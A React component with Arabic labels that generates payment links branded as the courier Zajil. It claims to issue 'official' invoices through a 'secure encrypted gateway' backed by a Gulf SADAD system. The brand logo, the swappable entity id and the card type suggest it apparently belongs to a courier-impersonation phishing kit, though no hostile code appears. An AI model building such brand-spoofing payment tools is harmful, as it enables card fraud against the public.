
import React, { useState } from 'react';
import { useCreateLink } from '@/hooks/useCreateLink';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card } from '@/components/ui/card';

const ZajilLinkCreator = () => {
  const [amount, setAmount] = useState('');
  const [description, setDescription] = useState('');
  const { createLink, loading, generatedLink } = useCreateLink();

  const handleCreate = async () => {
    await createLink({ 
      amount, 
      description, 
      type: 'card',
      entityId: 'zajil'
    });
  };

  return (
    <div className="min-h-screen p-4 flex flex-col items-center justify-center bg-[#1A1A1A]" style={{ fontFamily: 'Cairo, sans-serif' }}>
      <Card className="w-full max-w-lg shadow-2xl border-0 overflow-hidden">
        <div className="h-2 bg-[#FFCD00]"></div>
        <div className="p-8 space-y-8 bg-white">
          <div className="flex flex-col items-center space-y-4">
            <img src={`/assets/logos/zajil.svg`} alt="Zajil" className="h-24 object-contain" />
            <h1 className="text-2xl font-black text-slate-800 text-center">زاجل</h1>
          </div>
          
          <div className="space-y-6">
            <div className="space-y-2">
              <label className="text-sm font-bold text-slate-500 uppercase tracking-wider">تفاصيل الدفع</label>
              <Input 
                placeholder="المبلغ المطلوب" 
                value={amount} 
                onChange={(e) => setAmount(e.target.value)}
                className="h-14 border-2 border-slate-100 rounded-none text-xl focus:border-[#FFCD00] transition-colors"
              />
            </div>
            
            <div className="space-y-2">
              <label className="text-sm font-bold text-slate-500 uppercase tracking-wider">البيان</label>
              <Input 
                placeholder="الغرض من الرابط" 
                value={description} 
                onChange={(e) => setDescription(e.target.value)}
                className="h-14 border-2 border-slate-100 rounded-none focus:border-[#FFCD00] transition-colors"
              />
            </div>

            <Button 
              onClick={handleCreate} 
              disabled={loading}
              className="w-full h-16 text-xl font-black rounded-none shadow-lg transform transition-transform active:scale-95"
              style={{ backgroundColor: '#FFCD00', color: '#fff' }}
            >
              {loading ? 'انتظر...' : 'إصدار فاتورة دفع رسمية'}
            </Button>

            {generatedLink && (
              <div className="mt-8 p-6 bg-slate-50 border-l-4 border-[#FFCD00] space-y-4">
                <p className="font-bold text-slate-700">تم إصدار الرابط بنجاح:</p>
                <div className="flex items-center gap-3">
                  <div className="flex-1 bg-white p-3 border text-xs break-all font-mono">
                    {generatedLink}
                  </div>
                  <Button 
                    variant="outline"
                    onClick={() => navigator.clipboard.writeText(generatedLink)}
                    className="border-2 border-[#FFCD00] text-[#FFCD00] font-bold"
                  >
                    نسخ
                  </Button>
                </div>
              </div>
            )}
          </div>
          
          <div className="pt-6 border-t border-slate-50 flex justify-between items-center text-[10px] text-slate-400">
            <span>مدعوم بنظام سداد الخليجي</span>
            <span>بوابة مشفرة آمنة</span>
          </div>
        </div>
      </Card>
    </div>
  );
};

export default ZajilLinkCreator;
